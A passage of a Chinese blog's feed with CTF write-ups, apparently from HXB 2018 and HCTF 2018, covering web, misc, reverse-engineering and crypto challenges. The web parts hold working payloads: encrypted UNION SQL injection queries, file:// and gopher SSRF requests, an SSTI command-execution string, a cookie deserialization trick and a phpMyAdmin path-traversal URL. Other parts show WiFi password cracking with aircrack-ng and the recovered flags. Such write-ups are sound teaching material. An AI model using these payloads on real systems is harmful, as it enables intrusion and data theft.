src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image006.jpg"></p><p>发现zip源码泄露，下载源码：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image008.jpg"></p><p>逻辑很简单，就是把加密的id取出来，然后解密，之后SQL查询，很明显的SQL注入，然后只是加了个加密。</p><p>根据解密函数，写个加密函数，之后把SQL语句加密提交就行了。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// header(&#x27;content-type:text/html;charset=utf-8&#x27;);</span></span><br><span class="line"><span class="comment">// require_once &#x27;../config.php&#x27;;</span></span><br><span class="line"><span class="comment">//解密过程</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decode</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">&#x27;&#x27;</span>,MCRYPT_MODE_CBC,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">mcrypt_generic_init($td,<span class="string">&#x27;ydhaqPQnexoaDuW3&#x27;</span>,<span class="string">&#x27;2018201920202021&#x27;</span>);</span><br><span class="line">$data = mdecrypt_generic($td,base64_decode(base64_decode($data)));</span><br><span class="line">mcrypt_generic_deinit($td);</span><br><span class="line">mcrypt_module_close($td);</span><br><span class="line"><span class="keyword">if</span>(substr(trim($data),<span class="number">-7</span>)!==<span class="string">&#x27;hxb2018&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;window.location.href=&quot;/index.php&quot;;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">return</span> substr(trim($data),<span class="number">0</span>,strlen(trim($data))<span class="number">-7</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">$td = mcrypt_module_open(MCRYPT_RIJNDAEL_128,<span class="string">&#x27;&#x27;</span>,MCRYPT_MODE_CBC,<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">mcrypt_generic_init($td,<span class="string">&#x27;ydhaqPQnexoaDuW3&#x27;</span>,<span class="string">&#x27;2018201920202021&#x27;</span>);</span><br><span class="line">$data = $data.<span class="string">&#x27;hxb2018&#x27;</span>;</span><br><span class="line">$data = mcrypt_generic($td,$data);</span><br><span class="line">mcrypt_generic_deinit($td);</span><br><span class="line">mcrypt_module_close($td);</span><br><span class="line">$data = base64_encode(base64_encode($data));</span><br><span class="line"><span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// echo encode(&#x27;0 union select 1,2,3,4#&#x27;).&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">// echo encode(&#x27;0 union select 1,database(),version(),4#&#x27;).&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">// K3hId1N2UVpNcjFENkFja0FtMHdrN2JhOUx4ZE82R1VhU0k0UXRITlRaS2w0dnRBV2Yva3VnWFdXa21TNWhOaA==</span></span><br><span class="line"><span class="comment"># mozhe_discuz_stormgroup</span></span><br><span class="line"><span class="comment"># 5.1.73</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// echo encode(&#x27;0 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=database()#&#x27;).&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">// K3hId1N2UVpNcjFENkFja0FtMHdrM1NpZEZ4Z2o0TktKSElob2Z3YithcmtBYStsR0VLVUVPdFZPeHE4THZLcnYxMEpjM3FjZ0QxMHpTSHBTSExobG1IeHArc3NsMzlDaDM1TlpsTUdVb2NEMnpvNDRpcUMrVzl6ZFR2L1lobG1Yd083WnJocC80ZURGNnJaVlh4c1RyUzNKQXZVdFdRODdKQ01iQmEzYnJBPQ==</span></span><br><span class="line"><span class="comment">// notice,notice2,stormgroup_member</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// echo encode(&#x27;0 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema=database() and table_name=&quot;stormgroup_member&quot;#&#x27;).&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">// K3hId1N2UVpNcjFENkFja0FtMHdrM1NpZEZ4Z2o0TktKSElob2Z3YithckVCelF1dUJ6S2doQ3pOR2pxOGZBSDIzOWdxYlYwayt6Nm1oRU1PZUZscWVMU3BQMGgzWTNabmdHMmQ2ZXBXWVUrOVltWmZWQWtVNWM2dFVjQm1jWEM5YmlxWGF6R0N3WE1JWG52WXVONHFMRE1iZ0kyM3BtN2Y5TktKUUZoMm9KV2RmRGV5N3RreDlFV0t0QTFjRlpUOFdiRGQ0Q2FVa3h4b2JvNUc1U0FSQT09</span></span><br><span class="line"><span class="comment">// id,name,password,status</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// echo encode(&#x27;0 union select 1,name,password,4 from stormgroup_member#&#x27;).&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">// mozhe1</span></span><br><span class="line"><span class="comment">// 356f589a7df439f6f744ff19bb8092c0</span></span><br><span class="line"><span class="comment">// dsan13</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// echo encode(&#x27;0 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema=database() and table_name=&quot;notice2&quot;#&#x27;).&quot;\n&quot;;</span></span><br><span class="line"><span class="comment">// id,title</span></span><br><span class="line"><span class="keyword">echo</span> encode(<span class="string">&#x27;0 union select 1,group_concat(id),group_concat(title),4 from notice2#&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="comment">// K3hId1N2UVpNcjFENkFja0FtMHdrMlVPU1lyV2NyNUc5Q240TXB0UldaaEtMakFxSWwxeTZEWmdrQU1rRERVMDhldVNZa1ZRV1lZbGdDZFUySFVJR05ZSmNjRWlBRTdwb2dNUFdhVERjN3M9</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image010.jpg"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image012.jpg"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image014.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: hxb2018&#123;7a2709e852f6ee9e6ead206d055cd38&#125;</span><br></pre></td></tr></table></figure><h2 id="Readflag"><a href="#Readflag" class="headerlink" title="Readflag"></a>Readflag</h2><p>提示非常明显SSRF，首先SSRF+file协议读文件，我想知道web目录，于是读apache的配置文件：</p><p><a href="http://47.107.238.167/?url=file:///etc/apache2/sites-available/000-default.conf">http://47.107.238.167/?url=file:///etc/apache2/sites-available/000-default.conf</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># The ServerName directive sets the request scheme, hostname and port that # the server uses to identify itself. This is used when creating # redirection URLs. In the context of virtual hosts, the ServerName # specifies what hostname must appear in the request&#39;s Host: header to # match this virtual host. For the default virtual host (this file) this # value is not decisive as it is used as a last resort host regardless. # However, you must set it for any further virtual host explicitly. #ServerName www.example.com ServerAdmin webmaster@localhost DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;ssrf&#x2F;web.php # Available loglevels: trace8, ..., trace1, debug, info, notice, warn, # error, crit, alert, emerg. # It is also possible to configure the loglevel for particular # modules, e.g. #LogLevel info ssl:warn ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined # For most configuration files from conf-available&#x2F;, which are # enabled or disabled at a global level, it is possible to # include a line for only one particular virtual host. For example the # following line enables the CGI configuration for this host only # after it has been globally disabled with &quot;a2disconf&quot;. #Include conf-available&#x2F;serve-cgi-bin.conf # vim: syntax&#x3D;apache ts&#x3D;4 sw&#x3D;4 sts&#x3D;4 sr noet</span><br></pre></td></tr></table></figure><p>得到web目录</p><p><code>/var/www/html/ssrf/web.php</code></p><p>拿到源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;ssrf me with parameter &#x27;url&#x27;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$ch = curl_init(); </span><br><span class="line">curl_setopt($ch, CURLOPT_URL, $_GET[<span class="string">&#x27;url&#x27;</span>]); </span><br><span class="line"><span class="comment">//echo $_GET[&#x27;url&#x27;];</span></span><br><span class="line">curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span></span><br><span class="line">curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line"><span class="keyword">echo</span> curl_exec($ch); </span><br><span class="line">curl_close($ch); </span><br><span class="line"></span><br><span class="line"><span class="comment">//var_dump($_POST);</span></span><br><span class="line">$ip = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">  <span class="keyword">if</span>($_POST[<span class="string">&#x27;user&#x27;</span>]==<span class="string">&quot;admin&quot;</span> &amp;&amp; $ip==<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    system(<span class="string">&quot;/var/www/html/ssrf/readflag&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析逻辑，不难发现想要绕过这个判断执行程序，需要一个服务器本地代理，利用gopher协议可以做到：</p><p>paylaod：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;?url&#x3D;gopher%3A%2F%2F127.0.0.1%3A80%2F_POST+%2F+HTTP%2F1.1%250d%250aHost%3A+127.0.0.1%250d%250aUser-Agent%3A+curl%2F7.43.0%250d%250aAccept%3A+%2A%2F%2A%250d%250aContent-Length%3A+10%250d%250aContent-Type%3A+application%2Fx-www-form-urlencoded%250d%250a%250d%250auser%3Dadmin</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image028.jpg"></p><p>事实上，本题存在非预期解，因为flag文件直接就在web目录下，所以可以直接通过file协议去读flag文件：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image030.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: hxb2018&#123;0ef0c0d15f1a33b47af2a01669fbf124&#125;</span><br></pre></td></tr></table></figure><h2 id="MyNote"><a href="#MyNote" class="headerlink" title="MyNote"></a>MyNote</h2><p>/robots.txt容易发现源码泄露</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image032.jpg"></p><p>在/User.php中发现函数__destruct()</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image034.jpg"></p><p>可能存在反序列化，又发现上传文件后，会多一个Cookie—Picture。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image036.jpg"></p><p>base64解一下，容易出来</p><p><code>a:1:&#123;i:0;s:32:&quot;F2006061314554700166_400x400.jpg&quot;;&#125;</code></p><p>发现是原文件名的序列化。</p><p>将其改为想读取的文件：flag的序列化，BASE64加密得到</p><p>把原来的文件名改为flag.php</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image038.gif"></p><p>得到新的cookie，修改cookie得到flag</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image040.jpg"></p><p>base64解码得到flag。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image042.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: hxb2018&#123;445b40b69867325f6145eca1e77fc8e1&#125;</span><br></pre></td></tr></table></figure><h2 id="XmeO"><a href="#XmeO" class="headerlink" title="XmeO"></a>XmeO</h2><p>注册登录然后add的内容能进行模板注入</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&#39;ls&#39;).read()&#125;&#125; </span><br></pre></td></tr></table></figure><p>选项填否，然后点show得到回显</p><p>读auto.js</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> var url&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:9990&#x2F;admin&quot;</span><br><span class="line"> setInterval(function()&#123;</span><br><span class="line"> var webPage &#x3D; require(&#39;webpage&#39;);</span><br><span class="line"> var page &#x3D; webPage.create();</span><br><span class="line"> ​</span><br><span class="line"> var setting&#x3D;&#123;</span><br><span class="line">   operation: &quot;GET&quot;,</span><br><span class="line">   encoding: &quot;utf8&quot;,</span><br><span class="line">   headers: &#123;</span><br><span class="line">​           &quot;Referer&quot;:url</span><br><span class="line">​         &#125;,</span><br><span class="line"> &#125;;</span><br><span class="line"> ​</span><br><span class="line"> page.addCookie(&#123;</span><br><span class="line">   &#39;name&#39;     : &#39;hint&#39;,</span><br><span class="line">   &#39;value&#39;   : &#39;Try to get admin\&#39;s page content&#39;,</span><br><span class="line">   &#39;domain&#39;   : &#39;127.0.0.1&#39;,</span><br><span class="line">   &#39;path&#39;     : &#39;&#x2F;admin&#x2F;&#39;,</span><br><span class="line">   &#39;httponly&#39; : false,</span><br><span class="line">   &#39;secure&#39;   : false,</span><br><span class="line">   &#39;expires&#39; : (new Date()).getTime() + (1000 * 60 * 60)</span><br><span class="line"> &#125;);</span><br><span class="line"> ​</span><br><span class="line"> page.addCookie(&#123;</span><br><span class="line">   &#39;name&#39;     : &#39;flag&#39;,</span><br><span class="line">   &#39;value&#39;   : &#39;hxb2018&#123;29ffadfd3c22c8928f544c0b576e100f&#125;&#39;,</span><br><span class="line">   &#39;domain&#39;   : &#39;127.0.0.1&#39;,</span><br><span class="line">   &#39;path&#39;     : &#39;&#x2F;admin&#x2F;mysecrecy_directory&#39;,</span><br><span class="line">   &#39;httponly&#39; : false,</span><br><span class="line">   &#39;secure&#39;   : false,</span><br><span class="line">   &#39;expires&#39; : (new Date()).getTime() + (1000 * 60 * 60)</span><br><span class="line"> &#125;);</span><br><span class="line"> page.addCookie(&#123;</span><br><span class="line">   &#39;name&#39;     : &#39;session&#39;,</span><br><span class="line">   &#39;value&#39;   : &#39;eyJjc3JmX3Rva2VuIjp7IiBiIjoiWlRZNE0yUXlNR1pqTkRJNU16RXpOalJqWkRNMk4yUmxZVGd4TXpFelpHTmpabVEwWVRSak1RPT0ifSwidXNlcm5hbWUiOiJhZG1pbiJ9.DoVbkw.ylHkvfjRjM42G1I0gkcTQz4Hi5U&#39;,</span><br><span class="line">   &#39;domain&#39;   : &#39;127.0.0.1&#39;,</span><br><span class="line">   &#39;path&#39;     : &#39;&#x2F;admin&#x2F;&#39;,</span><br><span class="line">   &#39;httponly&#39; : true,</span><br><span class="line">   &#39;secure&#39;   : false,</span><br><span class="line">   &#39;expires&#39; : (new Date()).getTime() + (1000 * 60 * 60)</span><br><span class="line"> &#125;);</span><br><span class="line"> ​</span><br><span class="line"> page.open(url,setting,function(status)&#123;</span><br><span class="line">   console.log(page.content);</span><br><span class="line">   setTimeout(function()&#123;&#125;,7000);</span><br><span class="line"> &#125;);</span><br><span class="line"> ​</span><br><span class="line"> &#125;,7000);</span><br><span class="line"></span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>在page.addCookie中看到了flag。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: hxb2018&#123;29ffadfd3c22c8928f544c0b576e100f&#125;</span><br></pre></td></tr></table></figure><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Disk"><a href="#Disk" class="headerlink" title="Disk"></a>Disk</h2><p>挂载vmdk文件，得到四个txt文件，NTFS交换数据流隐写，拼接得到的二进制</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image044.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01100110 01101100 01100001 01100111 01111011 00110100 01000100 01010011 01011111 00110001 01101110 01011111 01000100 00110001 01110011 01101011 01111101 </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: flag&#123;4DS_1n_D1sk&#125;</span><br></pre></td></tr></table></figure><h2 id="flow"><a href="#flow" class="headerlink" title="flow"></a>flow</h2><p>首先下载的是无线流量包，一般思路是解wifi密码，然后那这个做密钥来解流量报文。</p><p>利用kali的工具aircrack-ng，加上字典，容易破解得到密码password1</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image048.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">aircrack-ng ctf.pcap  -w 33889.txt</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image050.jpg"></p><p>之后利用这个密码来解流量数据包，命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">airdecap-ng.exe ctf.pcap -e ctf -p password1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image052.jpg"></p><p>之后wireshark分析得到的流量包：追踪一个http流，容易发现flag</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image054.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: flag&#123;H4lf_1s_3n0ugh&#125;</span><br></pre></td></tr></table></figure><h2 id="Hidden-Write"><a href="#Hidden-Write" class="headerlink" title="Hidden Write"></a>Hidden Write</h2><p>搜索png的文件格式尾16进制49454E44AE</p><p>得到3个结果：</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image056.jpg"></p><p>说明有三张png图片，分别提取出来，之后在一张稍大点的png中，发现LSB隐写。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image058.jpg"></p><p>得到一半flag</p><p><code>hxb2018&#123;1e30f3b836d78d25c</code></p><p>双图或多图，容易想到盲水印攻击，于是利用脚本，发现成功</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image062.jpg"></p><p>得到另一半flag</p><p><code>20b4a&#125;</code></p><p>于是得到完整的flag</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: hxb2018&#123;1e30f3b836d78d25c20b4a&#125;</span><br></pre></td></tr></table></figure><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h2><p>IDA打开程序后几乎没什么东西，查壳发现常见的upx壳。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image016.jpg"></p><p>直接用upx脱壳机脱掉，提示有重定向，而且不能运行，但是不影响静态调试。放到IDA里查看。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image018.jpg"></p><p>逻辑不复杂，只有一个加密函数,sub_401090。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image020.jpg"></p><p>发现byte_402151[]和byte_402150[]指的是同一个字符串。在hexView里提取出来，前面两位0x32和0x61也要加上（根据后面长度判断）。</p><p>而这个byte_4021A0数组，通过IDA的findcrypt插件可以发现这其实是AES加密中的S盒，为了方便直接从AES加密里把这个数组拿出来即可。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image022.jpg"></p><p>最后按照处理过程编写脚本，基本就是照着逻辑照抄，爆破即可。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">box &#x3D; [0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,</span><br><span class="line"></span><br><span class="line">                               0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,</span><br><span class="line"></span><br><span class="line">                               0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,</span><br><span class="line"></span><br><span class="line">                               0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,</span><br><span class="line"></span><br><span class="line">                               0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,</span><br><span class="line"></span><br><span class="line">                               0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,</span><br><span class="line"></span><br><span class="line">                               0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,</span><br><span class="line"></span><br><span class="line">                               0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,</span><br><span class="line"></span><br><span class="line">                               0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,</span><br><span class="line"></span><br><span class="line">                               0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,</span><br><span class="line"></span><br><span class="line">                               0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,</span><br><span class="line"></span><br><span class="line">                               0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,</span><br><span class="line"></span><br><span class="line">                               0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,</span><br><span class="line"></span><br><span class="line">                               0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,</span><br><span class="line"></span><br><span class="line">                               0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,</span><br><span class="line"></span><br><span class="line">                               0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key &#x3D; [50, 97, 52, 57, 102, 54, 57, 99, 51, 56, 51, 57, 53, 99, 100, 101, 57, 54, 100, 54, 100, 101, 57, 54, 100, 54, 102, 52, 101, 48, 50, 53, 52, 56, 52, 57, 53, 52, 100, 54, 49, 57, 53, 52, 52, 56, 100, 101, 102, 54, 101, 50, 100, 97, 100, 54, 55, 55, 56, 54, 101, 50, 49, 100, 53, 97, 100, 97, 101, 54]</span><br><span class="line"> </span><br><span class="line">f &#x3D; &#39;&#39;</span><br><span class="line">for i in range(0,35):</span><br><span class="line">       for j in range(0,256):</span><br><span class="line">        v5 &#x3D; chr(j)</span><br><span class="line">        v6 &#x3D; (ord(v5)&gt;&gt;4)%16</span><br><span class="line">        v7 &#x3D; (16*ord(v5)&gt;&gt;4)%16</span><br><span class="line">v8 &#x3D; key[2*i]</span><br><span class="line">   if v8 &lt; 48 or v8 &gt; 57:</span><br><span class="line">     v9 &#x3D; v8 - 87</span><br><span class="line">       else:</span><br><span class="line">v9 &#x3D; v8 - 48</span><br><span class="line">v11 &#x3D; v9*16</span><br><span class="line">v10 &#x3D; key[2*i+1]</span><br><span class="line">if v10 &lt; 48 or v10 &gt; 57:</span><br><span class="line">v12 &#x3D; v10 - 87</span><br><span class="line">else:</span><br><span class="line">v12 &#x3D; v10 - 48</span><br><span class="line">if box[16*v6+v7] &#x3D;&#x3D; ((v11+v12)^0x19):</span><br><span class="line">f +&#x3D; v5</span><br><span class="line">print f</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image024.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag: flag&#123;Th1s_1s_Simple_Rep1ac3_Enc0d3&#125;</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Common-Crypto"><a href="#Common-Crypto" class="headerlink" title="Common Crypto"></a>Common Crypto</h2><p>拿到exe打开要求输入flag，随便输点东西回车程序就关了。于是直接扔到IDA里看。（截图中变量名有的经过自定义，为了方便看）</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image064.jpg"></p><p>gets获取输入的flag，然后进入sub_140001000(&amp;key);这个函数查看。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image066.jpg"></p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image068.jpg"></p><p>能够清晰的找到这里的key值，把它取出来</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image070.jpg"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">key &#x3D; [0x1b, 0x2e, 0x35, 0x46, 0x58, 0x6e ,0x72, 0x86, 0x9b,0xa7,0xb5,</span><br><span class="line"></span><br><span class="line">0xc8,0xd9,0xef,0xff,0xc]</span><br></pre></td></tr></table></figure><p>下面的处理过程经过和AES加密的代码对比，应该是正常的加密过程。</p><p>再进入<code>sub_1400012A0((unsigned __int8 *)&amp;flag, (__int64)&amp;key);</code>这个函数查看。基本上确定是常规的AES加密，代码过多不再贴图。</p><p>但是有个问题是key的长度是16，加密后做比较的字符串长度却太长了</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image072.jpg"></p><p>按照原理，密钥长度是根据明文扩展的，而明文和密文应该是一样长，于是尝试把这段密文分成两半。分别尝试解密过程。幸运的是，前半段就成功了。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image074.jpg"></p><p>解出来一堆数字，再结合刚刚后半段的数字，猜测是十六进制转字符串。</p><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/clip_image076.jpg"></p><p>自己添加个}，尝试提交成功。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag:  hxb2018&#123;aa8871759de6f35215205566&#125;</span><br></pre></td></tr></table></figure><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>累了，睡了，醒来学习二进制、、、 </p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSTI </tag>
            
            <tag> 反序列化 </tag>
            
            <tag> SQL注入 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HCTF2018-WP</title>
      <link href="/2018/11/12/HCTF-WP/"/>
      <url>/2018/11/12/HCTF-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参加HCTF，但是熬了两天也没什么输出==、真的体会到和真正的大佬之间的差距，在强大的表哥的带领下取得12名的成绩，我感觉还是很不错。只可惜还进不了决赛、、、</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h2><p>一个CVE</p><p>参考<a href="http://www.lsafe.org/?p=300">CVE-2018-12613 PHPMYADMIN后台文件包含分析</a></p><p>payload</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;warmup.2018.hctf.io&#x2F;index.php?file&#x3D;hint.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br><span class="line"></span><br><span class="line">http:&#x2F;&#x2F;warmup.2018.hctf.io&#x2F;index.php?file&#x3D;hint.php?&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/qingchenldl/BlogImage/master/img/1541771012184.png"></p><h2 id="kzone"><a href="#kzone" class="headerlink" title="kzone"></a>kzone</h2><p><code>www.zip</code>有源码泄露</p><p>审计源码发现<code>admin/login.php</code> 